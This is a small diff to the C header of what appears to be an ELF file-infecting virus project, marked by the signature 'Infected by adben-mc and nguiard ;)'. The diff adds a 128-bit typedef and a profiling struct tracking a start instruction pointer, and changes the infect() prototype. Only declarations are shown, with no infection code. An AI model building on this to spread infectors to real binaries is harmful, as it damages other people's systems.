@@ -23,6 +23,7 @@
 
 typedef	char *				str;
 typedef	unsigned char		byte;
+typedef	unsigned __int128	uint128_t;
 
 #define SIGNATURE		"Infected by adben-mc and nguiard ;)"
 #define SIGNATURE_LEN	36
@@ -33,6 +34,11 @@ typedef struct dirent {
 	unsigned short	d_reclen;
 	char			d_name[256];
 }	dirent;
+
+typedef struct profiling {
+	byte	*start_rip;
+	size_t	size;
+}	profiling;
 
 typedef struct elf_data {
 	Elf64_Ehdr	*elf;
@@ -71,7 +77,10 @@ bool	ft_memcmp(const byte *a, const byte *b, size_t size);
 void	ft_memcpy(byte *dest, const byte *src, size_t size);
 
 //	Infection
-bool	infect(const str path);
+bool	infect(profiling *this, const str path);
+
+//	Profiling
+profiling	get_profiling(byte *start_rip);
 
 // Debug purpose
 #ifdef DEBUG
